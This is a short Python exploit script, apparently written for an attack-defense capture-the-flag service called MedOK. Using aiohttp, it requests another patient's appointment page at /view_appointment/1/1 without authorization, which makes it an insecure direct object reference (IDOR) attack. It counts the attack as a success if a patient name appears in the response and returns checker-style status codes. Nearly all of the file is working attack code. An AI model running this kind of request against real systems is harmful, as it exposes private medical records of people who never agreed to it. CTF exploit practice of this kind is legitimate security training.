# Sploit (IDOR) for MedOK
# Author: boomgarang

import aiohttp
import asyncio
from colorama import Fore, Style

async def sploit_idor(HOST, PORT):
    url = f'http://{HOST}:{PORT}/view_appointment/1/1'

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    text = await response.text()
                    if "Иванов Иван Иванович" in text:
                        print(Fore.GREEN + f"[+] IDOR Exploit Success" + Style.RESET_ALL)
                        return 101, None
                print(Fore.RED + "[-] IDOR Exploit Fail" + Style.RESET_ALL)
                return 102, None
    except Exception as e:
        print(Fore.RED + f"[-] Error checking IDOR Expoloit: {e}" + Style.RESET_ALL)
        return 110, None

async def pwn(HOST):
    VERDICT = await sploit_idor(HOST, 5000)
    print(VERDICT)
    return VERDICT

loop = asyncio.get_event_loop()
loop.run_until_complete(pwn('localhost'))
